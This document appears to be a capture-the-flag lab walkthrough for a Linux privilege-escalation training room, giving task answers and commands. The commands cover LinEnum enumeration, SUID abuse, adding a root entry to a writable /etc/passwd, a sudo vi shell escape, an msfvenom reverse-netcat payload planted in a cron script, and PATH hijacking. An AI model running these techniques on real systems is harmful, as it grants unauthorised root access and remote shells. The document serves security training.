# Common Linux Privesc

- Deploy the machine

	  no answer needed

- Read the information about privilege escalation

	  no answer needed

- Understand the difference between Horizontal and Vertical privilege escalation.

	  no answer needed

- First, lets SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.

	- `ssh user3@<TARGET_IP>`, `yes` and insert password.
	- On your machine `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
	- On your machine `sudo python3 -m http.server`
	- On target `wget http://<YOUR_IP>:8000/LinEnum.sh`
	- `chmod +x LinEnum.sh`
	- `./LinEnum.sh`

- What is the target's hostname?

	- `polobox`

- Look at the output of /etc/passwd how many "user[x]" are there on the system?

	- `8`

- How many available shells are there on the system?

	- `4`

- What is the name of the bash script that is set to run every 5 minutes by cron?

	- `autoscript.sh`

- What critical file has had its permissions changed to allow some users to write to it?

	- `/etc/passwd`

- Well done! Bear the results of the enumeration stage in mind as we continue to exploit the system!

	  no answer needed

- What is the path of the file in user3's directory that stands out to you?

	- `/home/user3/shell`

- We know that "shell" is an SUID bit file, therefore running it will run the script as a root user! Lets run it! We can do this by running: "./shell"

	  no answer needed

- Congratulations! You should now have a shell as root user, well done!

	  no answer needed

- First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user7, with the password "password"

	  no answer needed

- Having read the information above, what direction privilege escalation is this attack?

	- `vertical`

- Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: "openssl passwd -1 -salt [salt] [password]" What is the hash created by using this command with the salt, "new" and the password "123"?

	- `***********************`

- Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username "new" and the password hash we created before?

	- Read the hint
	- `*************************************************`

- Great! Now you've got everything you need. Just add that entry to the end of the /etc/passwd file!

	  no answer needed

- Now, use "su" to login as the "new" account, and then enter the password. If you've done everything correctly- you should be greeted by a root prompt! Congratulations!

	  no answer needed

- First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user8, with the password "password"

	  no answer needed

- Let's use the "sudo -l" command, what does this user require (or not require) to run vi as root?

	- `NOPASSWD`

- So, all we need to do is open vi as root, by typing "sudo vi" into the terminal.

	  no answer needed

- Now, type ":!sh" to open a shell!

	  no answer needed

- First, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user4, with the password "password"

	  no answer needed

- Now, on our host machine- let's create a payload for our cron exploit using msfvenom.

	  no answer needed

- What is the flag to specify a payload in msfvenom?

	- `-p`

- Create a payload using: `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`

	  no answer needed

- What directory is the "autoscript.sh" under?

	- `/home/user4/Desktop`

- Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"

	  no answer needed

- After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: "nc -lvp 8888" and wait for our shell to land!

	  no answer needed

- After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations! 

	  no answer needed

- Going back to our local ssh session, not the netcat root session, you can close that now, let's exit out of root from our previous task by typing "exit". Then use "su" to swap to user5, with the password "password"

	  no answer needed

- Let's go to user5's home directory, and run the file "script". What command do we think that it's executing?

	- `ls`

- Now we know what command to imitate, let's change directory to "tmp".

	  no answer needed

- Now we're inside tmp, let's create an imitation executable. The format for what we want to do is: echo "[whatever command we want to run]" > [name of the executable we're imitating] What would the command look like to open a bash shell, writing to a file with the name of the executable we're imitating

	- `echo "/bin/bash" > ls`

- Great! Now we've made our imitation, we need to make it an executable. What command do we execute to do this?

	- `chmod +x ls`

- Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! We do this using the command "export PATH=/tmp:$PATH". Note, this will cause you to open a bash prompt every time you use "ls". If you need to use "ls" before you finish the exploit, use "/bin/ls" where the real "ls" executable is. Once you've finished the exploit, you can exit out of root and use "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH" to reset the PATH variable back to default, letting you use "ls" again!

	  no answer needed

- Now, change directory back to user5's home directory.

	  no answer needed

- Now, run the "script" file again, you should be sent into a root bash prompt! Congratulations!

	  no answer needed

- Well done, you did it!

	  no answer needed




